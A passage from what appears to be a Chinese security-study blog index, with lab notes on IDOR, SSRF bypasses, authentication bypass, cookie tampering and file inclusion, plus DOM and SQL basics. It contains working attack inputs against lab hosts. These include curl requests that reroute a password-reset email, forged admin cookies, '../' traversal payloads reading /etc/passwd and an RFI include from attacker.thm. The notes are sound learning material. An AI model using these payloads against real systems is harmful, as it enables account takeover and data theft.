Cookie。\n","date":"2025-03-19T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/9e73050aede3552bc3b00fe7cfe1120f427c37f01e08ad760bbdfa9abc939b1c.png","permalink":"https://Yerucrem.github.io/p/http-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/","title":"HTTP 详细信息"},{"content":"IDOR基础 什么是IDOR IDOR（ Insecure Direct Object Reference） 代表不安全的直接对象引用，是一种访问控制漏洞。\n当 Web 服务器收到用户提供的输入以检索对象（文件、数据、文档），对输入数据给予了太多信任，并且未在服务器端对其进行验证以确认所请求的对象属于请求它的用户时，就会发生这种类型的漏洞。\n示例 假设您刚刚注册了一项在线服务，并且想要更改您的个人资料信息。您单击的链接将转到 http://online-service.thm/profile?user_id=1305，您可以看到您的信息。\n好奇心让您尝试将 user_id 值更改为 1000 （http://online-service.thm/profile?user_id=1000），令您惊讶的是，您现在可以看到其他用户的信息。您现在发现了一个 IDOR 漏洞！理想情况下，应该在网站上进行检查，以确认用户信息属于请求它的用户。\n在编码中发现IDOR 当通过帖子数据、查询字符串或 cookie 将数据从一个页面传递到另一个页面时，Web 开发人员通常首先会获取原始数据并对其进行编码。编码可确保接收 Web 服务器能够理解内容。编码将二进制数据转换为 ASCII 字符串，通常使用 a-z、A-Z、0-9 和 = 字符 用于填充。Web 上最常见的编码技术是 base64 编码，通常很容易被发现。您可以使用网站 Like https://www.base64decode.org/ 解码字符串，然后编辑数据并使用 https://www.base64encode.org/ 再次重新编码，然后重新提交 Web 请求以查看响应是否有更改。\n请参阅下图作为此过程的图形示例：\n哈希IDOR 散 列 ID 比编码的 ID 要复杂一些，但它们可能遵循可预测的模式，例如是整数值的哈希版本。例如，如果使用 md5 哈希，则 ID 号 123 将变为 202cb962ac59075b964b07152d234b70。\n值得将任何发现的哈希值通过 Web 服务，例如 https://crackstation.net/（它有一个包含数十亿个 hash to value 结果的数据库），看看我们是否能找到任何匹配项。\nUnpredictable IDs 如果使用上述方法无法检测到 ID，则 IDOR 检测的一个很好的方法是创建两个帐户并在它们之间交换 ID 号。如果您可以使用其他用户的 ID 号查看其他用户的内容，同时仍然使用其他账户登录（或根本未登录），则您发现了有效的 IDOR 漏洞。\nIDOR在哪里 您所针对的易受攻击的终端节点可能并不总是您在地址栏中看到的。它可能是您的浏览器通过 AJAX 请求加载的内容，或者您在 JavaScript 文件中找到引用的内容。\n有时，终端节点可能有一个未引用的参数，该参数可能在开发过程中有所用处，并被推送到生产环境中。例如，您可能会注意到对 /user/details 的调用显示您的用户信息（通过您的会话进行身份验证）。但是通过一种称为参数挖掘的攻击，您发现了一个名为 user_id 的参数，您可以使用它来显示其他用户的信息，例如 /user/details？user_id=123\n","date":"2025-03-19T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/54afbc538832e9159efdc2ac951b4fabecad8304bd717a9aece08e26440c0690.png","permalink":"https://Yerucrem.github.io/p/idor%E5%9F%BA%E7%A1%80/","title":"IDOR基础"},{"content":"SSRF基础 什么是SSRF SSRF 代表服务器端请求伪造。这是一个漏洞，允许恶意用户使 Web 服务器向攻击者选择的资源发出额外或经过编辑的 HTTP 请求。\nSSRF 的类型 SSRF 漏洞有两种类型;第一个是常规 SSRF，其中数据返回到攻击者的屏幕。第二个是盲目 SSRF 漏洞，其中发生了 SSRF，但没有信息返回到攻击者的屏幕。\n影响是什么？ 成功的 SSRF 攻击可能导致以下任何情况：\n进入未经授权的区域。 访问客户/组织数据。 能够扩展到内部网络。 显示身份验证令牌/凭据。 查找SSRF漏洞 可以通过多种不同的方式在 Web 应用程序中发现潜在的 SSRF 漏洞。以下是四个常见位置的示例：\n当地址栏的参数中使用完整 URL 时：\n表单中的隐藏字段：\n部分 URL，例如主机名：\n或者可能只是 URL 的路径：\n其中一些示例比其他示例更容易被利用，因此需要进行大量试验和错误才能找到有效的有效负载。\n如果使用盲 SSRF，并且没有输出反射给您，则需要使用外部 HTTP 日志记录工具来监控请求，例如 requestbin.com、您自己的 HTTP 服务器或 Burp Suite 的协作者客户端。\n常见的防御手段与应对 更了解安全漏洞的开发人员意识到 SSRF 漏洞的风险，可以在其应用程序中实施检查，以确保请求的资源符合特定规则。通常有两种方法，拒绝列表或允许列表。\n拒绝列表 在拒绝列表 （Deny List） 中，接受除列表中指定的资源或与特定模式匹配的资源之外的所有请求。Web 应用程序可以使用拒绝列表来保护敏感端点、IP 地址或域不被公众访问，同时仍允许访问其他位置。限制访问的特定端点是 localhost，它可能包含服务器性能数据或其他敏感信息，因此 localhost 和 127.0.0.1 等域名会出现在拒绝列表中。攻击者可以使用替代本地主机引用绕过拒绝列表，例如 0、0.0.0.0、0000、127.1、127...*、2130706433、017700000001 或具有解析为 IP 地址 127.0.0.1 的 DNS 记录的子域，例如 127.0.0.1.nip.io。\n此外，在云环境中，阻止对 IP 地址 169.254.169.254 的访问将是有益的，该地址包含已部署云服务器的元数据，包括可能的敏感信息。攻击者可以通过在自己的域上注册一个子域来绕过此问题，该子域的 DNS 记录指向 IP 地址 169.254.169.254。\n允许列表 在允许列表中，除非所有请求都显示在列表中或与特定模式匹配，例如参数中使用的 URL 必须以 https://website.thm 开头的规则，否则所有请求都会被拒绝。攻击者可以通过在攻击者的域名上创建子域（例如 https://website.thm.attackers-domain.thm）来快速规避此规则。应用程序逻辑现在将允许此输入，并允许攻击者控制内部 HTTP 请求。\n打开重定向 如果上述绕过不起作用，那么攻击者还有一个技巧，即开放重定向。开放重定向是服务器上的一个端点，网站访问者会在其中自动重定向到另一个网站地址。以 link https://website 为例。thm/link？url=https：//tryhackme.com 的创建此端点是为了记录访客出于广告/营销目的点击此链接的次数。但是想象一下，存在一个潜在的 SSRF 漏洞，其严格的规则只允许以 https://website 开头的 URL。thm/。攻击者可以利用上述功能将内部 HTTP 请求重定向到攻击者选择的域。\n","date":"2025-03-19T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/5e5493849d8aa623ccc456998df80032a5625b429097b062a957b14d4fce5079.png","permalink":"https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/","title":"SSRF基础"},{"content":"身份验证绕过 用户名枚举 暴力 逻辑缺陷 什么是逻辑缺陷？ 有时身份验证过程包含逻辑缺陷。逻辑缺陷是指应用程序的典型逻辑路径被黑客绕过、规避或纵。逻辑缺陷可以存在于网站的任何区域，但在这种情况下，我们将专注于与身份验证相关的示例。\n逻辑缺陷示例 下面的模拟代码示例检查客户端正在访问的路径的开头是否以 /admin 开头，如果是，则进行进一步检查以查看客户端是否实际上是 admin。如果页面不以 /admin 开头，则会向客户端显示该页面。\n1 2 3 4 5 if( url.substr(0,6) === \u0026#39;/admin\u0026#39;) { # Code to check user is an admin } else { # View Page } 因为上面的 PHP 代码示例使用了三个等号 （===），所以它正在查找字符串的完全匹配项，包括相同的字母大小写。该代码存在逻辑缺陷，因为请求 /adMin 的未经身份验证的用户将不会检查其权限，而是向他们显示页面，从而完全绕过身份验证检查。\n逻辑缺陷实用 我们将检查 Acme IT 支持网站 （http：//MACHINE_IP/customers/reset） 的重置密码 功能。我们看到一个表单，要求提供与我们希望执行密码重置的账户关联的电子邮件地址。如果输入的电子邮件无效，您将收到错误消息Account not found from provided email address\n出于演示目的，我们将使用 email address robert@acmeitsupport.thm被接受。然后，我们会看到表单的下一阶段，该阶段要求提供与此登录电子邮件地址关联的用户名。如果我们输入 robert 作为用户名并按下 Check Username 按钮，您将看到一条确认消息，告知将向 robert@acmeitsupport.thm发送一封密码重置电子邮件。\n在此阶段，您可能想知道此应用程序中的漏洞可能是什么，因为您必须知道电子邮件和用户名，然后将密码链接发送到帐户所有者的电子邮件地址。\n在重置电子邮件过程的第二步中，用户名在 POST 字段中提交到 Web 服务器，电子邮件地址在查询字符串请求中作为 GET 字段发送。\n让我们通过使用 curl 工具手动向 Web 服务器发出请求来说明这一点。\n1 user@tryhackme$ curl \u0026#39;http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -d \u0026#39;username=robert\u0026#39; 我们使用该标志向请求添加额外的标头。在这种情况下，我们将 设置为 ，这让 Web 服务器知道我们正在发送表单数据，以便它正确理解我们的请求。\n在应用程序中，使用查询字符串检索用户帐户，但稍后，在应用程序逻辑中，使用 PHP 变量 $_REQUEST 中的数据发送密码重置电子邮件。\nPHP$_REQUEST 变量是一个数组，其中包含从查询字符串接收的数据和 POST 数据。如果查询字符串和 POST 数据使用相同的键名称，则此变量的应用程序逻辑优先使用 POST 数据字段而不是查询字符串，因此，如果我们向 POST 表单添加另一个参数，我们可以控制密码重置电子邮件的发送位置。\n1 user@tryhackme$ curl \u0026#39;http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -d \u0026#39;username=robert\u0026amp;email=attacker@hacker.com\u0026#39; **下一步，您需要在 Acme IT 支持客户部分创建一个帐户，这样做会为您提供一个可用于创建支持票证的唯一电子邮件地址。电子邮件地址的格式为 {username}@customer.acmeitsupport.thm\n现在重新运行 Curl 请求 2，但使用您的 @acmeitsupport。thm 在电子邮件字段中，您将在您的帐户上创建一个票证，其中包含一个链接，用于以 Robert 身份登录。使用 Robert 的帐户，您可以查看他们的支持票证并显示标志。\n1 user@tryhackme:~$ curl \u0026#39;http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -d \u0026#39;username=robert\u0026amp;email={username}@customer.acmeitsupport.thm\u0026#39; Cookie 篡改 在联机会话期间检查和编辑 Web 服务器设置的 Cookie 可能会产生多种结果，例如未经身份验证的访问、访问其他用户帐户或提升的权限。\n纯文本 某些 cookie 的内容可以是纯文本形式，并且它们的作用很明显。例如，如果这些是成功登录后设置的 Cookie：\n1 2 Set-Cookie: logged_in=true; Max-Age=3600; Path=/ Set-Cookie: admin=false; Max-Age=3600; Path=/ 我们看到一个 Cookie （logged_in），它似乎用于控制用户当前是否登录，以及另一个 （admin），它控制访客是否具有管理员权限。使用这个逻辑，如果我们要更改 cookie 的内容并发出请求，我们将能够更改我们的权限。\n首先，我们先请求目标页面：\n1 user@tryhackme$ curl http://MACHINE_IP/cookie-test 我们可以看到我们返回了一条消息：Not Logged In\n现在，我们将发送另一个请求，其中 logged_in Cookie 设置为 true，管理 Cookie 设置为 false：\n1 user@tryhackme$ curl -H \u0026#34;Cookie: logged_in=true; admin=false\u0026#34; http://MACHINE_IP/cookie-test 我们收到消息：Logged In As A User\n最后，我们将发送最后一个请求，将 logged_in 和 admin Cookie 都设置为 true：\n1 user@tryhackme$ curl -H \u0026#34;Cookie: logged_in=true; admin=true\u0026#34; http://MACHINE_IP/cookie-test 这将返回结果：Logged In As An Admin\nHashing 散列法 有时 Cookie 值看起来像一长串随机字符;这些称为哈希，它是原始文本的不可逆表示。以下是您可能会遇到的一些示例：\n原始字符串 ** 哈希方法** 输出 1 md5 c4ca4238a0b923820dcc509a6f75849b 1 sha-256 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b 1 sha-512 4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a 1 sha1 356a192b7913b04c54574d18c28d46e6395428ab 从上表中可以看出，同一输入字符串的哈希输出可能会因使用的哈希方法而显著不同。即使哈希是不可逆的，但每次都会产生相同的输出，这对我们很有帮助，因为 https://crackstation.net/ 等服务会保留数十亿个哈希及其原始字符串的数据库。\n编码 编码类似于哈希，因为它会创建看似随机的文本字符串，但实际上，编码是可逆的。所以这就引出了一个问题，编码的意义何在？编码使我们能够将二进制数据转换为人类可读的文本，这些文本可以通过仅支持纯文本 ASCII 字符的介质轻松安全地传输。\n常见的编码类型包括 base32 和 base64，前者将二进制数据转换为字符 A-Z 和 2-7，后者使用字符 a-z、A-Z、0-9、+ 和 equals 符号进行转换进行填充。\n以以下数据为例，该数据由 Web 服务器在登录时设置：\n1 Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/ 这个字符串 base64 解码的值为 {“id”：1，“admin”： false} ，然后我们可以再次将其编码回 base64 编码，但将 admin 值设置为 true，这现在为我们提供了管理员访问权限。\n","date":"2025-03-19T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/4e4cc31a34179ac0e517d1c37a2925a57eb72a8878519af127e313034f388b04.png","permalink":"https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/","title":"身份验证绕过"},{"content":"文件包含基础 介绍 此房间旨在为您提供利用文件包含漏洞的基本知识，包括本地文件包含 （LFI）、远程文件包含 （RFI） 和目录遍历。此外，我们还将讨论发现这些漏洞的风险以及所需的补救措施。我们提供了每个漏洞的一些实际示例以及实践挑战。\n在某些情况下，编写 Web 应用程序是为了通过参数请求访问给定系统上的文件，包括图像、静态文本等。参数是附加到 URL 的查询参数字符串，可用于检索数据或根据用户输入执行作。 下图分解了 URL 的基本部分。\n例如，参数用于 Google 搜索，其中 GET 请求将用户输入传递到搜索引擎中。 https://www.google.com/search?q=TryHackMe。\n让我们讨论一个用户请求从 Web 服务器访问文件的场景。首先，用户向 Web 服务器发送一个 HTTP 请求，其中包含要显示的文件。例如，如果用户想要在 Web 应用程序中访问和显示其 CV，则请求可能如下所示，http://webapp.thm/get.php?file=userCV.pdf，其中 file 是参数，userCV.pdf是要访问的必需文件。\n为什么会出现文件包含漏洞？ 文件包含漏洞通常在 Web 应用程序（如 PHP ）的各种编程语言 中发现和利用，这些应用程序编写和实现都很糟糕。这些漏洞的主要问题是输入验证，其中用户输入没有经过清理或验证，由用户控制它们。当输入未经过验证时，用户可以将任何输入传递给函数，从而导致漏洞。\n文件包含有什么风险？ 默认情况下，攻击者可以利用文件包含漏洞来泄露数据，例如代码、凭据或与 Web 应用程序或作系统相关的其他重要文件。此外，如果攻击者可以通过任何其他方式将文件写入服务器，则文件包含可能会协同使用以获得远程命令执行 （RCE）。\n路径遍历 也称为目录遍历，允许攻击者读取作系统资源，例如运行应用程序的服务器上的本地文件。攻击者通过纵和滥用 Web 应用程序的 URL 来查找和访问存储在应用程序根目录之外的文件或目录，从而利用此漏洞。\n当用户的输入传递到 PHP 中的 file_get_contents 等函数时，会出现路径遍历漏洞。请务必注意，该函数并不是导致此漏洞的主要因素。通常，糟糕的输入验证或筛选是导致此漏洞的原因。在 PHP 中，您可以使用 file_get_contents 读取文件的内容。\n下图显示了 Web 应用程序如何在 /var/www/app 中存储文件。满意的路径是用户请求 从定义的路径 /var/www/app/CVs userCV.pdf。\n我们 可以通过添加有效负载来测试 URL 参数，以查看 Web 应用程序的行为方式。路径遍历攻击，也称为点-点-斜杠攻击，利用双点将目录上移一步。 如果攻击者找到入口点，在本例中为 get.php?file=，那么攻击者可能会发送如下内容 http://webapp.thm/get.php?file=../../../../etc/passwd\n假设没有输入验证，而不是访问 PDF 文件位于 /var/www/app/CVs 位置，则 Web 应用程序会从其他 目录，在本例中为 /etc/passwd。每个 .. 条目都会移动一个目录，直到到达根目录 /。然后，它将目录更改为 /etc，然后从那里读取 passwd 文件。\n因此，Web 应用程序将文件的内容发送回给用户。\n同样，如果 Web 应用程序在 Windows 服务器上运行，攻击者需要提供 Windows 路径。例如，如果攻击者想要读取位于c:\\boot.ini 中的 boot.ini 文件，则攻击者可以根据目标尝试以下作 作系统版本：\n1 2 3 http://webapp.thm/get.php?file=../../../../boot.ini 或 http://webapp.thm/get.php?file=../../../../windows/win.ini 与 Linux作系统相同的概念在这里适用，在这种作系统中，我们爬上目录直到它到达根目录，这通常是 .\n有时，开发人员会添加过滤器以限制仅访问某些文件或目录。以下是测试时可以使用的一些常见作系统文件。\n位置 描述 /etc/issue 包含要在登录提示之前打印的消息或系统标识。 /etc/profile 控制系统范围的默认变量，如导出变量、文件创建掩码 （umask）、终端类型、邮件消息，以指示新邮件何时到达 /proc/version 指定 Linux 内核的版本 etc/passwd 等/passwd 具有有权访问系统的所有注册用户 /etc/shadow 包含有关系统用户密码的信息 /root/.bash_history 包含 root 用户的 history 命令 /var/log/dmessage 包含全局系统消息，包括系统启动期间记录的消息 `/var/mail/root 根用户的所有电子邮件 /root/.ssh/id_rsa 服务器上 root 或任何已知有效用户的私有 SSH 密钥 /var/log/apache2/access.log Web 服务器的访问请求 C:\\boot.ini C：\\boot.ini 包含具有 BIOS 固件的计算机的启动选项 本地文件包含 LFI 一 针对 Web 应用程序的 LFI 攻击通常是由于开发人员缺乏安全意识。使用 PHP 时，使用 include、require、include_once 和 require_once 等功能通常会导致 Web 应用程序易受攻击。在这个房间里，我们将挑选 PHP，但值得注意的是，使用其他语言（如 ASP、JSP）甚至在 Node.js 应用程序中也会出现 LFI 漏洞。LFI 漏洞利用遵循与路径遍历相同的概念。\n1 2 3 \u0026lt;?PHP include($_GET[\u0026#34;lang\u0026#34;]); ?\u0026gt; 上面的 PHP 代码通过 URL 参数 lang 使用 GET 请求来包含页面的文件。可以通过发送以下 HTTP 请求来完成调用，如下所示：http://webapp.thm/index.php?lang=EN.php 加载英文页面或 http://webapp.thm/index.php?lang=AR.php加载阿拉伯语页面，其中 EN.php 和 AR.php文件位于同一目录中。\n理论上，如果没有任何输入验证，我们可以从上面的代码中访问和显示服务器上的任何可读文件。假设我们想读取 /etc/passwd 文件，其中包含有关 Linux作系统用户的敏感信息，我们可以尝试以下作：http://webapp.thm/get.php?file=/etc/passwd\n在这种情况下，它之所以有效，是因为 include 函数中没有指定目录，也没有输入验证。\n二 接下来，在下面的代码中，开发人员决定指定函数内部的目录。\n1 2 3 \u0026lt;?PHP include(\u0026#34;languages/\u0026#34;. $_GET[\u0026#39;lang\u0026#39;]); ?\u0026gt; 在上面的代码中，开发者决定使用 include 函数，只通过 lang 参数调用 languages 目录下的 PHP 页面。\n如果没有输入验证，攻击者可以通过将 lang 输入替换为其他作系统敏感文件（如 /etc/passwd）来纵 URL。\n同样，有效负载看起来类似于路径遍历，但 include 函数允许我们将任何调用的文件包含到当前页面中。以下是漏洞利用：\n1 http://webapp.thm/index.php?lang=../../../../etc/passwd 本地文件包含 LFI2 在这项任务中，我们将更深入地了解 LFI。我们讨论了在 include 函数中绕过过滤器的几种技术。\n在前两种情况下，我们检查了 Web 应用程序的代码，然后我们知道如何利用它。但是，在本例中，我们正在执行黑盒测试，其中我们没有源代码。在这种情况下，错误对于了解数据如何传递和处理到 Web 应用程序中非常重要。\n在此方案中，我们有以下入口点： http://webapp.thm/index.php?lang=EN 。如果我们输入无效的输入（例如 THM），则会收到以下错误\n1 Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12 错误消息泄露了重要信息。输入 THM 作为输入后，将显示一条错误消息，显示 include 函数的外观：include（languages/THM.php）;。\n如果你仔细查看该目录，我们可以看出 functions includes files in the languages 目录正在添加 .php 的 API 文件。因此，有效的输入将如下所示：index.php？lang=EN，其中文件 EN 位于给定的语言目录中，名为 EN。php 的\n此外，错误消息还泄露了有关完整 Web 应用程序目录路径的另一条重要信息，即 /var/www/html/THM-4/\n要利用这一点，我们需要使用 ../ 技巧，如 目录遍历 部分所述，以导出当前文件夹。让我们尝试以下作：\n1 http://webapp.thm/index.php?lang=../../../../etc/passwd 请注意，我们使用了 4 ../ 因为我们知道该路径有四个级别 /var/www/html/THM-4。但我们仍然收到以下错误：\n1 Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12 似乎我们可以移出 PHP 目录，但是 include 函数仍然使用 .PHP 最后！这告诉我们开发人员指定要传递给 include 函数的文件类型。要绕过这种情况，我们可以使用 NULL BYTE，即 %00。\n使用空字节是一种注入技术，其中 URL 编码的表示形式（如 %00 或 0x00）以十六进制表示形式与用户提供的数据一起终止字符串。您可以将其视为试图欺骗 Web 应用程序忽略 Null Byte 之后的任何内容。\n通过在有效负载的末尾添加 Null Byte，我们告诉 include 函数忽略 null 字节之后的任何内容，这可能如下所示：\n1 include(\u0026#34;languages/../../../../../etc/passwd%00\u0026#34;).\u0026#34;.php\u0026#34;); `等同于 `include(\u0026#34;languages/../../../../../etc/passwd\u0026#34;); 注意： %00 技巧是固定的，不适用于 PHP 5.3.4 及更高版本。\n四 现在在实验 #4 中应用这个技术，并弄清楚如何读取 /etc/passwd。\nhttp://webapp.thm/index.php?lang=../../../../etc/passwd\n我们收到了以下错误！\n1 Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15 如果我们检查 include（languages/etc/passwd） 部分中的警告消息，我们知道 Web 应用程序替换了 ../ 替换为空字符串。我们可以使用几种技术来绕过这种情况。\n首先，我们可以发送以下 payload 来绕过它： ....//....//....//....//....//etc/passwd\n这之所以有效，是因为 PHP 过滤器仅匹配并替换第一个子集字符串 ../ 它找到并且不执行另一次传递，留下下图所示的内容。\n五 最后，我们将讨论开发人员强制 include 从定义的目录中读取的情况！例如，如果 Web 应用程序要求提供必须包含目录的输入，例如： http://webapp.thm/index的php?lang=languages/EN.php然后，要利用这一点，我们需要将目录包含在有效负载中，如下所示： ?lang=languages/../../../../../etc/passwd 。\n远程文件包含 RFI 远程文件包含 （RFI） 是一种将远程文件包含到易受攻击的应用程序中的技术。与 LFI 一样，RFI 发生在对用户输入进行不当审查时，从而允许攻击者将外部 URL 注入 include 函数。RFI 的一个要求是需要打开 allow_url_fopen 选项。\nRFI 的风险高于 LFI，因为 RFI 漏洞允许攻击者在服务器上获得远程命令执行 （RCE）。RFI 攻击成功的其他后果包括：\n敏感信息泄露 跨站点脚本 （XSS） 拒绝服务 （DoS） 外部服务器必须与应用程序服务器通信，才能成功进行 RFI 攻击，攻击者在其服务器上托管恶意文件。然后，恶意文件通过 HTTP 请求注入 include 函数，恶意文件的内容在易受攻击的应用程序服务器上执行。\nRFI步骤 下图是成功进行 RFI 攻击的步骤示例！假设攻击者在他们自己的服务器 http：//attacker 上托管了一个 PHP 文件。thm/cmd.txt，其中 cmd.txt 包含打印消息 Hello THM.\n1 \u0026lt;?PHP echo \u0026#34;Hello THM\u0026#34;; ?\u0026gt; 首先，攻击者注入恶意 URL，该 URL 指向攻击者的服务器，例如 http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt的攻击者。THM/cmd.txt。如果没有输入验证，则恶意 URL 将传递到 include 函数中。接下来，Web 应用程序服务器将向恶意服务器发送 GET 请求以获取文件。因此，Web 应用程序将远程文件包含在 include 函数中，以执行页面内的 PHP 文件并将执行内容发送给攻击者。在我们的示例中，当前页面在某处必须显示 Hello THM 消息。\n","date":"2025-03-19T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/638445f84229dc4814eb81dfe06baeb837e3a5e8920ec39035d8dd6e02c0a10d.png","permalink":"https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/","title":"文件包含基础"},{"content":"DOM Document Object Model 文档对象模型\n什么是文档对象模型？ \u0026mdash; What is the Document Object Model?\nDOM 是什么？ 想象一下，你有一张房子的建筑蓝图，上面画着房子的每一个部分：墙、门、窗户、屋顶等等。DOM 就像是网页的“蓝图”。当你打开一个网页，浏览器会把网页的 HTML 代码（那些 \u0026lt;html\u0026gt;、\u0026lt;div\u0026gt;、\u0026lt;p\u0026gt; 标签）解析成一个树状结构，这个结构就是 DOM。它把网页里的每一个元素（比如标题、段落、图片）都整理得清清楚楚，让计算机（特别是 JavaScript）能找到它们、操作它们。\n简单来说，DOM 是网页的骨架图，它把网页的内容变成一个个“节点”（node），这些节点就像蓝图上的标记点，互相之间还有父子关系、兄弟关系，形成一个大树。\n1 2 3 4 5 6 7 8 9 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;我的网页\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;欢迎\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;这是一个段落。\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 在这个 HTML 里，DOM 会把它变成一个树形结构：\n1 2 3 4 5 6 7 8 9 - \u0026lt;html\u0026gt; 是根节点，就像树的树根，整个网页的起点。 - \u0026lt;html\u0026gt; 下面有两个“孩子”：\u0026lt;head\u0026gt; 和 \u0026lt;body\u0026gt;。 - \u0026lt;head\u0026gt; 里有个孩子 \u0026lt;title\u0026gt;，它的内容是“我的网页”。 - \u0026lt;body\u0026gt; 里有两个孩子：\u0026lt;h1\u0026gt;（内容是“欢迎”）和 \u0026lt;p\u0026gt;（内容是“这是一个段落。”）。 这就像一个家庭的家谱：\u0026lt;html\u0026gt; 是爷爷，\u0026lt;head\u0026gt; 和 \u0026lt;body\u0026gt; 是他的两个孩子，\u0026lt;title\u0026gt; 是 \u0026lt;head\u0026gt; 的孩子，\u0026lt;h1\u0026gt; 和 \u0026lt;p\u0026gt; 是 \u0026lt;body\u0026gt; 的孩子。每个节点都是一个“对象”，有自己的属性，比如 \u0026lt;p\u0026gt; 的 innerHTML 属性就是“这是一个段落。”。 DOM 有什么用？ DOM 的牛逼之处在于，它让 JavaScript 能和网页互动。有了 DOM，JavaScript 就像一个装修工人，可以拿着网页的蓝图（DOM）去干活：\n查看：找到某个节点，看看它是什么内容。 修改：比如把 \u0026lt;p\u0026gt; 的文字从“这是一个段落。”改成“这是新段落！”。 添加：在 \u0026lt;body\u0026gt; 里加一个新的 \u0026lt;p\u0026gt; 节点。 删除：把某个节点去掉。 举个例子：你想做一个网页，用户点一个按钮，页面上的文字就变了。你可以用 JavaScript 写代码，通过 DOM 找到那个文字所在的节点，然后改它的内容。比如：\n1 找到 \u0026lt;p\u0026gt; 节点 let paragraph = document.querySelector(\u0026#34;p\u0026#34;); // 修改它的内容 paragraph.innerHTML = \u0026#34;文字被我改啦！\u0026#34;; 再比如，你想做一个待办事项列表，用户点按钮就能添加新任务。这也是通过 DOM 实现的：JavaScript 创建一个新节点（比如 \u0026lt;li\u0026gt;），然后把它加到列表里。\nDOM 是桥梁 所以，DOM 就像是网页（HTML）和 JavaScript 之间的“翻译官”或者“桥梁”。HTML 负责写出网页的内容和结构，DOM 把这些内容变成一个树形结构，JavaScript 通过 DOM 来动态地控制网页，让网页不再是静态的，而是可以互动、有变化的。\n小结 用最简单的话说：\nDOM 是网页的树形蓝图，把每个元素都变成节点。 JavaScript 通过 DOM 操作网页，可以改内容、加东西、删东西。 它让网页变得活起来，能根据用户的操作动态变化。 ","date":"2025-03-18T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/f4a6e2d065c3c9fcd40dfb76bc3317b0d466b12c787faa354faa62457ded2ba5.png","permalink":"https://Yerucrem.github.io/p/dom-%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B/","title":"DOM 文档对象模型"},{"content":"SQL注入 SQL 语法不区分大小写。\nSQL基础 SELECT 我们将学习的第一种查询类型是用于从数据库中检索数据的 SELECT 查询。\nselect * from users;\n第一个单词 SELECT 告诉数据库我们想要检索一些数据;* 告诉数据库我们想从表中接收所有列。例如，该表可能包含三列（id、username 和 password）。“from users” 告诉数据库我们想要从名为 users 的表中检索数据。最后，末尾的分号告诉数据库这是查询的结束。\n下一个查询与上述查询类似，但这次，我们不是使用 * 返回数据库表中的所有列，而是只请求 username 和 password 字段。\nselect username,password from users;\n与第一个查询一样，以下查询使用 * 选择器返回所有列，然后 “LIMIT 1” 子句强制数据库仅返回一行数据。将查询更改为 “LIMIT 1,1” 会强制查询跳过第一个结果，然后 “LIMIT 2,1” 会跳过前两个结果，依此类推。您需要记住，第一个数字告诉数据库您希望跳过多少个结果，第二个数字告诉数据库要返回多少行。\nselect * from users LIMIT 1;\nselect * from users where username='admin';\n这只会返回 username 等于 admin 的行。\nselect * from users where username != 'admin';\n这只会返回 username 不 等于 admin 的行。\nselect * from users where username='admin' or username='jon';\n这只会返回用户名等于 admin 或 jon 的行。\nselect * from users where username='admin' and password='p4ssword';\n这只会返回用户名等于 admin 且密码等于 p4ssword 的行.\nlike 使用 like 子句允许您指定不完全匹配，而是以特定字符开头、包含或结尾的数据，方法是选择放置由百分号表示的通配符的位置。\nselect * from users where username like '%n';\n这将返回用户名以字母 n 结尾的任何行。\nselect * from users where username like '%mi%';\n这将返回用户名中包含字符 mi 的任何行。\nUNION UNION 语句将两个或多个 SELECT 语句的结果组合在一起，以从单个或多个表中检索数据;此查询的规则是 UNION 语句必须在每个 SELECT 语句中检索相同数量的列，列必须具有相似的数据类型，并且列顺序必须相同。这听起来可能不是很清楚，所以让我们使用下面的类比。假设一家公司想要为所有客户和供应商创建一个地址列表，以便发布新目录。我们有一个名为 customers 的表，其中包含以下内容：\n另一个表叫 suppliers，内容如下：\n使用以下 SQL 语句，我们可以从两个表中收集结果并将它们放入一个结果集中：\nSELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;\nINSERT INSERT 语句告诉数据库我们希望在表中插入一行新数据。 “into users” 告诉数据库我们希望将数据插入到哪个表中， “（username，password）” 提供我们提供数据的列，然后 “values （\u0026lsquo;bob\u0026rsquo;，\u0026lsquo;password\u0026rsquo;）”; 提供以前指定的列的数据。\ninsert into users (username,password) values ('bob','password123');\nUPDATE UPDATE 